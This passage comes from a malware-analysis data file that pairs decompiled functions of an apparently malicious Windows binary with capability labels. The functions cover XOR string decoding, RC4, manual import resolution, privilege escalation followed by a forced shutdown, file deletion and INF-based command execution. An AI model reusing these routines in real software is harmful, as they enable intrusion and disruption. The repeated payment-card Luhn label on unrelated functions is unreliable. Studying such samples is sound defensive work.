>> 1 < 0x20) {\n        do {\n            if (iVar4 == iVar7) goto code_r0x004028bb;\n            iVar7 = (&var_28h)[iVar6];\n            iVar6 = iVar6 + 1;\n        } while (iVar7 != 0);\n        uVar5 = 0;\n    }\n    else {\ncode_r0x004028bb:\n        uVar5 = 1;\n    }\n    return uVar5;\n}\n",
        "token_count": 468
    },
    "004044c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __fastcall fcn.004044c0(int16_t *param_1, uint param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint *puVar4;\n    uint lpUrlComponents;\n    uint var_2ch;\n    uint var_28h;\n    \n    puVar4 = &lpUrlComponents;\n    for (iVar2 = 0x3c; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    lpUrlComponents = 0x3c;\n    var_28h = 0x104;\n    piVar3 = param_1;\n    do {\n        iVar1 = *piVar3;\n        piVar3 = piVar3 + 1;\n    } while (iVar1 != 0);\n    var_2ch = param_2;\n    iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpCrackUrl)(param_1, piVar3 - (param_1 + 1) >> 1, 0, &lpUrlComponents);\n    return iVar2 != 0;\n}\n",
        "token_count": 268
    },
    "004050a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004050a0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uint var_410h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_10h = param_1;\n    uVar2 = 0;\n    var_8h = 0;\n    var_1h._0_1_ = 0x22;\n    var_ch = 0;\n    do {\n        if (0x3ff < uVar2) {\n            iVar1 = var_8h + uVar2;\n            puVar3 = &var_410h;\n            puVar4 = var_8h + param_1;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            uVar2 = 0;\n            var_8h = iVar1;\n            param_1 = var_10h;\n        }\n        *(&var_410h + uVar2) = *(var_ch + param_1) ^ var_1h;\n        uVar2 = uVar2 + 1;\n        var_1h._0_1_ = var_1h + (var_ch % 0x85) * '\\x03';\n        var_ch = var_ch + 1;\n    } while (var_ch < 0x184);\n    if (uVar2 != 0) {\n        puVar3 = &var_410h;\n        puVar4 = var_8h + param_1;\n        for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 498
    },
    "004055fa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004055fa(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t arg_8h_00;\n    uchar *puVar5;\n    uint *puVar6;\n    uchar auStack48 [4];\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    puVar5 = auStack48;\n    for (iVar2 = 0x10; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    iVar4 = 0;\n    arg_8h_00 = 0;\n    uStack40 = arg_8h;\n    iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x43a, 0, arg_8h);\n    if (iVar2 != 0) {\n        puVar6 = &uStack44;\n        for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        uStack28 = 0x4400;\n        uStack44 = 0x413480;\n        uStack40 = 0;\n        uStack24 = 0x6200;\n        uStack36 = 0x417880;\n        uStack32 = 0;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        iVar3 = fcn.00407463();\n        if (iVar3 != 0) {\n            iVar3 = fcn.00407463();\n            arg_8h_00 = -(iVar3 != 0) & 0x10;\n        }\n        do {\n            iVar3 = fcn.00402f48(arg_8h_00);\n            if (iVar3 == 0) break;\n            (*_sym.imp.KERNEL32.dll_Sleep)(0x32);\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x14);\n        pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        (*pcVar1)(iVar2);\n    }\n    return 0;\n}\n",
        "token_count": 545
    },
    "00409936": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00409936(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint var_10h;\n    uint var_ch;\n    uint hModule;\n    uint var_4h;\n    \n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (iVar3 != 0) {\n        iVar6 = 0x104;\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(param_1, iVar3, iVar6);\n            pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if ((iVar4 == 0) || (iVar6 != iVar4)) break;\n            iVar6 = iVar6 + 0x104;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            uVar2 = (*pcVar1)(8, iVar6 * 2);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        } while (iVar3 != 0);\n        if (iVar3 != 0) {\n            if (iVar4 != 0) {\n                *param_2 = iVar3;\n                return 0;\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n            return uVar2;\n        }\n    }\n    return 8;\n}\n",
        "token_count": 423
    },
    "0040b0e5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __fastcall fcn.0040b0e5(int16_t *param_1)\n\n{\n    int16_t iVar1;\n    \n    iVar1 = *param_1;\n    if (iVar1 != 0x3d) {\n        do {\n            if (iVar1 == 0) break;\n            param_1 = param_1 + 1;\n            iVar1 = *param_1;\n        } while (iVar1 != 0x3d);\n        if (*param_1 != 0x3d) {\n            return NULL;\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 132
    },
    "0040b10b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.0040b10b(int16_t **arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    int16_t *piVar4;\n    int16_t *in_ECX;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    \n    if (in_ECX == NULL) {\n        in_ECX = *arg_8h;\n        if (in_ECX == NULL) {\n            return in_ECX;\n        }\n    }\n    do {\n        piVar3 = in_ECX;\n        piVar5 = 0x4117ac;\n        do {\n            iVar1 = *piVar5;\n            piVar5 = piVar5 + 1;\n            if (iVar1 == 0) {\n                piVar5 = piVar3 + 1;\n                if (*piVar3 == 0) {\n                    *arg_8h = NULL;\n                    return NULL;\n                }\n                do {\n                    piVar4 = piVar5;\n                    iVar1 = *piVar4;\n                    piVar6 = 0x4117ac;\n                    do {\n                        iVar2 = *piVar6;\n                        piVar6 = piVar6 + 1;\n                        if (iVar2 == iVar1) {\n                            if (iVar1 != 0) {\n                                *piVar4 = 0;\n                            }\n                            piVar5 = NULL;\n                            if (iVar1 != 0) {\n                                piVar5 = piVar4 + 1;\n                            }\n                            *arg_8h = piVar5;\n                            return piVar3;\n                        }\n                        piVar5 = piVar4 + 1;\n                    } while (iVar2 != 0);\n                } while( true );\n            }\n            in_ECX = piVar3 + 1;\n        } while (*piVar3 != iVar1);\n    } while( true );\n}\n",
        "token_count": 420
    },
    "0040b17e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __fastcall fcn.0040b17e(int16_t *param_1, int16_t param_2)\n\n{\n    int16_t *piVar1;\n    \n    piVar1 = NULL;\n    while( true ) {\n        if (*param_1 == param_2) {\n            piVar1 = param_1;\n        }\n        if (*param_1 == 0) break;\n        param_1 = param_1 + 1;\n    }\n    return piVar1;\n}\n",
        "token_count": 110
    },
    "0040d1c9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "terminate thread"
        ],
        "decompiled_code": "\nvoid fcn.0040d1c9(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    do {\n        (*_sym.imp.KERNEL32.dll_TerminateThread)(*(uVar1 + 0x41dd80), 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*(uVar1 + 0x41dd80));\n        uVar1 = uVar1 + 4;\n    } while (uVar1 < 0x40);\n    return;\n}\n",
        "token_count": 116
    },
    "0040e3a1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040e3a1(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *(param_1 + 0x3c);\n    if (*(iVar1 + 4 + param_1) == -0x799c) {\n        iVar1 = *(iVar1 + 0x88 + param_1);\n    }\n    else {\n        iVar1 = *(iVar1 + 0x78 + param_1);\n    }\n    return iVar1 + param_1;\n}\n",
        "token_count": 118
    },
    "0040e3c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040e3c0(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint16_t *puVar5;\n    uint var_14h;\n    uint var_10h;\n    uint lpString2;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.0040e3a1();\n    if (((iVar3 != 0) && (iVar1 = *(iVar3 + 0x1c),  iVar1 != 0)) && (*(iVar3 + 0x20) != 0)) {\n        var_8h = 0;\n        uVar2 = *(iVar3 + 0x18);\n        puVar5 = *(iVar3 + 0x24) + param_1;\n        piVar4 = *(iVar3 + 0x20) + param_1;\n        if (uVar2 != 0) {\n            do {\n                iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(*piVar4 + param_1, param_2);\n                if (iVar3 == 0) {\n                    return iVar1 + param_1 + *puVar5 * 4;\n                }\n                puVar5 = puVar5 + 1;\n                piVar4 = piVar4 + 1;\n                var_8h = var_8h + 1;\n            } while (var_8h < uVar2);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 358
    },
    "0040e446": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040e446(int32_t param_1, uint32_t param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    param_1 = *(param_1 + 0x3c) + param_1;\n    iVar1 = *(param_1 + 6);\n    iVar2 = param_1 + 0x18 + *(param_1 + 0x14);\n    while ((param_2 < *(iVar2 + 0xc) ||\n           ((*(param_1 + 0x3c) + -1 + *(iVar2 + 0x10) & ~(*(param_1 + 0x3c) - 1U)) + *(iVar2 + 0xc) <= param_2))) {\n        iVar1 = iVar1 + -1;\n        iVar2 = iVar2 + 0x28;\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return (*(iVar2 + 0x14) - *(iVar2 + 0xc)) + param_2;\n}\n",
        "token_count": 255
    },
    "0040e4ad": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040e4ad(uint hModule, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    \n    if ((arg_ch == 0) && (arg_ch = arg_10h,  arg_10h == 0)) {\n        uVar1 = 0xc000007b;\n    }\n    else {\n        puVar3 = in_ECX + arg_ch;\n        if (puVar3 == NULL) {\n            uVar1 = 0xc000007b;\n        }\n        else {\n            uVar2 = *puVar3;\n            if (uVar2 != 0) {\n                iVar4 = (in_ECX + arg_10h) - puVar3;\n                do {\n                    if (uVar2 < 0x80000000) {\n                        uVar2 = uVar2 + 2 + in_ECX;\n                    }\n                    else {\n                        uVar2 = uVar2 & 0xffff;\n                    }\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(hModule, uVar2);\n                    *(iVar4 + puVar3) = uVar1;\n                    puVar3 = puVar3 + 1;\n                    uVar2 = *puVar3;\n                } while (uVar2 != 0);\n            }\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 340
    },
    "0040e515": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040e515(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint lpModuleName;\n    uint phModule;\n    \n    iVar2 = *0x41da9c;\n    iVar4 = *(*(*0x41da9c + 0x3c) + 0x80 + *0x41da9c);\n    if (iVar4 == 0) {\n        uVar3 = 0xc000000d;\n    }\n    else {\n        puVar6 = iVar4 + *0x41da9c;\n        if (puVar6 == NULL) {\n            uVar3 = 0xc000000d;\n        }\n        else {\n            iVar4 = puVar6[3];\n            while (iVar4 != 0) {\n                if (iVar4 + iVar2 != 0) {\n                    iVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar4 + iVar2);\n                    if (iVar4 == 0) break;\n                    lpModuleName._0_1_ = 0;\n                    iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(iVar4, &lpModuleName, 0x104);\n                    if (iVar5 != 0) {\n                        (*_sym.imp.KERNEL32.dll_GetModuleHandleExA)(1, &lpModuleName, &phModule);\n                    }\n                    iVar4 = fcn.0040e4ad(iVar4, *puVar6, puVar6[4]);\n                    if (iVar4 != 0) break;\n                }\n                piVar1 = puVar6 + 8;\n                puVar6 = puVar6 + 5;\n                iVar4 = *piVar1;\n            }\n            uVar3 = 0;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 429
    },
    "0040e5b7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040e5b7(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uint var_414h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_10h = param_1;\n    var_14h = param_2;\n    var_8h = 0;\n    uVar2 = 0;\n    var_1h._0_1_ = 0x22;\n    var_ch = 0;\n    if (0 < param_2) {\n        do {\n            if (0x3ff < uVar2) {\n                iVar1 = var_8h + uVar2;\n                puVar3 = &var_414h;\n                puVar4 = var_8h + param_1;\n                for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                    *puVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                    puVar4 = puVar4 + 1;\n                }\n                uVar2 = 0;\n                var_8h = iVar1;\n                param_1 = var_10h;\n                param_2 = var_14h;\n            }\n            *(&var_414h + uVar2) = *(var_ch + param_1) ^ var_1h;\n            uVar2 = uVar2 + 1;\n            var_1h._0_1_ = var_1h + (var_ch % 0x85) * '\\x03';\n            var_ch = var_ch + 1;\n        } while (var_ch < param_2);\n        if (uVar2 != 0) {\n            puVar3 = &var_414h;\n            puVar4 = var_8h + param_1;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 547
    },
    "0040f7c5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040f7c5(int32_t *arg_8h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int16_t iVar3;\n    code *pcVar4;\n    int16_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint uVar8;\n    int16_t *in_ECX;\n    int16_t *piVar9;\n    char **in_EDX;\n    int16_t *piVar10;\n    uint uVar11;\n    int16_t *piVar12;\n    char *pcVar13;\n    uint var_ch;\n    uint var_8h;\n    uint lpWideCharStr;\n    \n    uVar11 = 0;\n    piVar5 = fcn.00404364();\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (piVar5 != NULL) {\n        piVar10 = piVar5;\n        do {\n            iVar3 = *piVar10;\n            piVar10 = piVar10 + 1;\n        } while (iVar3 != 0);\n        piVar9 = piVar5;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        piVar12 = in_ECX;\n        do {\n            iVar3 = *piVar12;\n            piVar12 = piVar12 + 1;\n        } while (iVar3 != 0);\n        uVar11 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)\n                           (8, ((piVar12 - (in_ECX + 1) >> 1) + (piVar9 - (piVar5 + 1) >> 1) +\n                               (piVar10 - (piVar5 + 1) >> 1)) * 2 + 0x140);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar11);\n        (*_sym.imp.USER32.dll_wsprintfW)\n                  (iVar6, \n                   L\"[Version]\\r\\nsignature = \\\"$CHICAGO$\\\"\\r\\nAdvancedINF = 2.5, \\\"You need a new version of advpack.dll\\\"\\r\\n\\r\\n[DefaultInstall]\\r\\nRunPreSetupCommands = %s:2\\r\\n\\r\\n[%s]\\r\\n%s\\r\\n\"\n                   , piVar5, piVar5, in_ECX);\n        if (iVar6 == 0) {\n            pcVar13 = NULL;\n        }\n        else {\n            iVar7 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar6);\n            iVar7 = iVar7 * 2 + 2;\n            uVar11 = (*pcVar4)(8, iVar7);\n            pcVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar11);\n            *pcVar13 = '\\0';\n            (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, iVar6, 0xffffffff, pcVar13, iVar7, 0, 0);\n        }\n        pcVar1 = pcVar13 + 1;\n        *in_EDX = pcVar13;\n        do {\n            cVar2 = *pcVar13;\n            pcVar13 = pcVar13 + 1;\n        } while (cVar2 != '\\0');\n        *arg_8h = pcVar13 - pcVar1;\n        uVar11 = 1;\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar5);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    }\n    return uVar11;\n}\n",
        "token_count": 806
    },
    "004018ac": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.004018ac(void)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar1 == 0) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "0040a5d0": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a5d0(uint param_1)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint lpBuffer;\n    uint var_8h;\n    int32_t lpNumberOfBytesRead;\n    \n    var_8h = param_1;\n    do {\n        *0x41dd58 = 0;\n        iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(param_1, 0x80000000, 3, 0, 3, 0, 0);\n        if (iVar2 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar2, &lpBuffer, 0x200, &lpNumberOfBytesRead, 0);\n            while ((iVar3 != 0 && (param_1 = var_8h,  lpNumberOfBytesRead != 0))) {\n                puVar4 = &lpBuffer;\n                iVar3 = lpNumberOfBytesRead;\n                do {\n                    uVar1 = *puVar4;\n                    puVar4 = puVar4 + 1;\n                    *0x41dd58 = *0x41dd58 >> 8 ^ *((uVar1 ^ *0x41dd58 & 0xff) * 4 + 0x4113a0) ^ 0xd202ef8d;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n                iVar3 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar2, &lpBuffer, 0x200, &lpNumberOfBytesRead, 0);\n                param_1 = var_8h;\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n            iVar2 = fcn.0040dca6(0x41dd4c);\n            if (iVar2 == 0) {\n                return;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    } while( true );\n}\n",
        "token_count": 451
    },
    "0040c565": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint fcn.0040c565(void)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = fcn.0040bf6b();\n        if (iVar1 != 0) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n    }\n    fcn.0040bf23();\n    return 0;\n}\n",
        "token_count": 82
    },
    "00407cf7": {
        "rules": [
            "open process",
            "check process job object/8aaf725824be4e7b84101cffc1f879ea"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00407cf7(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    \n    iVar4 = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, param_1);\n    if (iVar1 != 0) {\n        iVar2 = fcn.00405b09();\n        if (iVar2 != 0) {\n            iVar4 = fcn.004079ed();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    return iVar4 == 0;\n}\n",
        "token_count": 188
    },
    "0040b9c3": {
        "rules": [
            "contain loop",
            "modify access privileges",
            "shutdown system"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040b9c3(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint NewState;\n    uint lpLuid;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint TokenHandle;\n    uint var_4h;\n    \n    var_34h = 0xb220837;\n    var_30h = 0x1e091022;\n    var_2ch = 0x1f343914;\n    var_28h = 0x83e1518;\n    var_24h = 0x57061608;\n    var_10h = 0x63716d64;\n    var_ch._0_1_ = 0x57;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar6 = 0;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar5 != 0x785c7d) {\n            var_4h = 5;\n            *(iVar6 + iVar4) = *(&var_10h + iVar6 % 5) ^ (iVar6 + iVar4)[&var_34h - iVar4];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x14);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n    (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n    (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, iVar4, &lpLuid);\n    NewState = 1;\n    var_14h = 2;\n    (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0, 0, 0);\n    pcVar2 = _sym.imp.USER32.dll_ExitWindowsEx;\n    iVar6 = (*_sym.imp.USER32.dll_ExitWindowsEx)(6, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 == 0) {\n        (*pcVar2)(4, 0);\n    }\n    uVar3 = (*pcVar1)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return;\n}\n",
        "token_count": 628
    },
    "0040dc34": {
        "rules": [
            "query environment variable"
        ],
        "decompiled_code": "\nuchar * __fastcall fcn.0040dc34(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint nSize;\n    uint var_4h;\n    \n    puVar4 = NULL;\n    if ((param_1 != 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(param_1, 0, 0),  iVar1 != 0)) {\n        iVar3 = iVar1 * 2 + 8;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar3);\n        puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        puVar5 = puVar4;\n        if (puVar4 != NULL) {\n            for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(param_1, puVar4, iVar1);\n            if (iVar1 == 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar4);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                puVar4 = NULL;\n            }\n        }\n    }\n    return puVar4;\n}\n",
        "token_count": 337
    },
    "0040531e": {
        "rules": [
            "modify access privileges"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040531e(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint NewState;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint lpLuid;\n    uint var_8h;\n    int32_t TokenHandle;\n    \n    TokenHandle = param_2;\n    if (param_2 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n        if (iVar2 != 0) {\n            iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, param_1, &lpLuid);\n            iVar2 = 0;\n            if (iVar1 != 0) {\n                var_18h = lpLuid;\n                var_14h = var_8h;\n                NewState = 1;\n                var_10h = 2;\n                iVar2 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0x10, 0, 0);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, param_1, &lpLuid);\n        iVar2 = 0;\n        if (iVar1 != 0) {\n            var_18h = lpLuid;\n            var_14h = var_8h;\n            NewState = 1;\n            var_10h = 2;\n            iVar2 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0x10, 0, 0);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 452
    },
    "0040e360": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040e360(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    \n    uVar4 = 0;\n    iVar1 = fcn.0040dc34();\n    if (iVar1 != 0) {\n        param_1 = iVar1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(param_1);\n    if (iVar2 == 0) {\n        uVar4 = fcn.00409b94();\n    }\n    if (iVar1 != 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return uVar4;\n}\n",
        "token_count": 189
    }
}